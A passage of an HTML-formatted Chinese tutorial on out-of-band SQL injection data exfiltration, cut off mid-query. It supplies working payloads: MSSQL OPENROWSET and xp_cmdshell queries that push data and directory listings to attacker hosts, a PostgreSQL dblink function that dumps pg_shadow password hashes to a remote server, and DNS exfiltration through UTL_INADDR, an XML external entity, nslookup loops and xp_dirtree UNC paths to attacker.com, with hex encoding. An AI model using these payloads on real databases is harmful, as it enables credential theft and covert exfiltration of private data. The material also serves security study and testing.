&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;OPENROWSET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SQLOLEDB&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Network=DBMSSOCN;
Address=10.0.2.2;uid=sa;pwd=Mypassword&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SELECT review_author FROM reviews&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;向外部数据库传递数据&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;OPENROWSET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SQLOLEDB&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Network=DBMSOCN;
Address=192.168.0.1;uid=foo;pwd=password&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SELECT * FROM attacker_table&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; name &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; sysobjects &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; xtype&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;U&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;若拥有管理员权限并启动了xp_cmdshell&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#下列查询将使目标数据库发送C:\路径下的文件和目录列表：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;OPENROWSET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SQLOLEDB&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Network=DBMSSOCN;
Address=www.attacker.com:80; uid=sa; pwd=53kr3t&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SELECT * FROM table&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;xp_cmdshell &#39;dir C:\&#39;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;oracle也支持数据库连接，但是不能镶嵌其他查询&lt;/p&gt;
&lt;p&gt;PostgreSQL9.1或更高版本超级用户启用dblink拓展&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; EXTENSION dblink&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;利用dblink系列命令从攻击者数据库向由攻击者控制的PostgreSQL数据库实例复制数据。但是这些函数仅对行进行操作，而不是对结果集进行操作。如果按照这种方式，请先准备好编写依靠游标(cursor)遍历数据的PL/pgSQL函数。&lt;/p&gt;
&lt;p&gt;例子：转储了数据库用户及其散列后的密码：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;REPLACE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FUNCTION&lt;/span&gt; dumper&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;RETURNS&lt;/span&gt; void &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; $$
&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt;
rvar record&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;BEGIN&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;FOR&lt;/span&gt; rvar &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; usename&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;passwd &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; c &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; pg_shadow &lt;span class=&#34;token keyword&#34;&gt;LOOP&lt;/span&gt;
PERFORM dblink_exec&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;host=172.16.0.100 dbname=db user=uname password=Pass&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;insert into dumper values(&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;rvar&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;c&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&#39;)&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;LOOP&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
$$ &lt;span class=&#34;token keyword&#34;&gt;LANGUAGE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;plpgsql&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;DNS渗透&#34;&gt;&lt;a href=&#34;#DNS渗透&#34; class=&#34;headerlink&#34; title=&#34;DNS渗透&#34;&gt;&lt;/a&gt;DNS渗透&lt;/h4&gt;&lt;p&gt;网络只有入口过滤而没有出口过滤时，或者仅有TCP出口过滤时，数据库可直接向攻击者发送DNS请求。&lt;/p&gt;
&lt;p&gt;PostgreSQL、SQL server、Oracle均能直接或间接引发DNS请求，Oracle使用UTL_INADDR包，这个包包含一个明确用于查找转发条目(forward entry)的GET_HOST_ ADDRESS函数和一个用于查找逆向条目的GET_HOST_NAME函数：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;UTL_INADDR&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;GET_HOST_ADDRESS&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;www.victim.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; 
&lt;span class=&#34;token comment&#34;&gt;-- 返回192.168.1.0&lt;/span&gt;

UTL_INADDR&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;GET_HOST_NAME&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;192.168.1.0&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 返回www.victim.com&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;DNS函数不需要使用PL/SQL块，可以直接插入子查询或谓词&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#插入谓词提取数据库登录用户&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;UTL_INADDR&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;GET_HOST_ADDRESS&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;USER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; DUAL&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;.attacker.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;PostgreSQL使用XML解析库的一个小技巧来初始化DNS查询&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#将一个包含数据库用户名的查找发送给DNS服务器，以查找attacker.com&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; XMLPARSE&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;document &lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;?xml version:&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&amp;gt;&amp;lt;!DOCTYPE x [ &amp;lt;!ELEMENT x ANY &amp;gt;&amp;lt;!ENTITY xx SYSTEM &#34;http://&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&#39;attacker&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&#34;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;x&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;xx&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;x&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;只要PostgreSQL安装了dblink,在连接字符串中就可以指定一个主机名(hostname)以引发一次DNS查找，但这要求具有超级用户的访问权限。&lt;/p&gt;
&lt;p&gt;mssql可以通过xp_cmdshell存储过程来执行nslookup命令&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;xp_cmdshell &lt;span class=&#34;token string&#34;&gt;&#39;nslookup www.victim&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果攻击者的DNS服务器是公共可用的192.168.1.1，那么直接查找DNS请求&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;xp_cmdshell &lt;span class=&#34;token string&#34;&gt;&#39;nslookup www.victim 192.168.1.1&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以将这些代码绑定到一些shell脚本中以提取目录内容&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;EXEC master&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;xp_cmdshell &lt;span class=&#34;token string&#34;&gt;&#39;for /F &#34;tokens=5&#34;%i in (&#39;&lt;/span&gt;&#39;dir c:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&#39;&lt;span class=&#34;token string&#34;&gt;&#39;) do nslookup %i.attacker.com&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这是数据库所在机器的默认搜索域。可以为传递给nslookup的名称添加一个点号(.)，从而阻止在默认域中进行查找。&lt;/p&gt;
&lt;p&gt;其他储存过程,这些存储过程依赖于Windows对网络&lt;/p&gt;
&lt;p&gt;UNC(Universal Naming Convention,通用命名约定)路径的内在支持&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;xp_getfiledetails&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; Server &lt;span class=&#34;token number&#34;&gt;2000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;需要一个文件路径&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
xp_fileexist&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; Server &lt;span class=&#34;token number&#34;&gt;2000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2005&lt;/span&gt;、&lt;span class=&#34;token number&#34;&gt;2008&lt;/span&gt; 和 &lt;span class=&#34;token number&#34;&gt;2008&lt;/span&gt; R2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;需要一个文件路径&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
xp_dirtree&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; Server &lt;span class=&#34;token number&#34;&gt;2000.&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2005&lt;/span&gt;、&lt;span class=&#34;token number&#34;&gt;2008&lt;/span&gt; 和 &lt;span class=&#34;token number&#34;&gt;2008&lt;/span&gt; R2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;需要一个文件路径&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; 

&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@a&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;CHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SET&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@a&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;\\&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SYSTEM_USER&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;.attacker.com.&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;xp_dirtree &lt;span class=&#34;token variable&#34;&gt;@a&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#存储过程的参数列表禁止使用字符串连接，因而上述代码使用了一个中间变量来保存路径。SQL间接引发了对主机名sa.attacker.com的DNS查找，最终证明了是在使用管理员账户进行登录。&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;通过xp_cmdshell执行DNS查找时，路径中出现非法字符会导致桩解析器 (resolver stub)失败，从而无法尝试查找。同样，UNC路径多于128个字符也会导致桩解析器失败。可以先将希望检索的数据转换成完全能够被DNS处理的格式，一种做法是将数据转换成十六进制表示。SQL Server包含一个名为FN_VARBINTOHEXSTR() 的函数，它接收类型为VARBINARY的参数并返回该数据的十六进制表示。例如：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dbo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fn_varbintohexstr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;CAST&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SYSTEM_USER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VARBINARY&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 0x73006100&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;长度问题，substring()&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@a&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;CHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@a&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;\\&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dbo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fn_varbintohexstr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;CAST&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TOP&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; CAST&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;review_body &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;CHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;26&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VARBINARY&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;.attacker.com.&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;xp_dirtree &lt;span class=&#34;token variable&#34;&gt;@a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;-- &#34;0x4d6f7669657320696e20746869732067656e7265206f667465.attacker.com.&#34; 或 &#34;Movies in this genre ofte&#34;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;多行操作需要封装&lt;/p&gt;
&lt;h4 id=&#34;e-mail渗透&#34;&gt;&lt;a href=&#34;#e-mail渗透&#34; class=&#34;headerlink&#34; title=&#34;e-mail渗透&#34;&gt;&lt;/a&gt;e-mail渗透&lt;/h4&gt;&lt;p&gt;跟DNS类似，使用SMTP（Simple Mail Transfer Protocol,简单邮件传输协议）发送e-mail不需要直接连接发送者和接收者。该方法的限制在于异步性上。发送利用之后，e-mail需要过一段时间才能到达。&lt;/p&gt;
&lt;h4 id=&#34;HTTP渗透&#34;&gt;&lt;a href=&#34;#HTTP渗透&#34; class=&#34;headerlink&#34; title=&#34;HTTP渗透&#34;&gt;&lt;/a&gt;HTTP渗透&lt;/h4&gt;&lt;p&gt;适用场合是：数据库服务器拥有网络层许可来访问由攻击者控制的Web资源。SQL Server和MySQL没有包含构造HTTP请求的默认机制，使用自定义扩展实现，PostgreSQL可以使用外部语言封装成HTTP的函数，Oracle由UTL_HTTP和HTTPURITYPE包提供，public权限。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt;
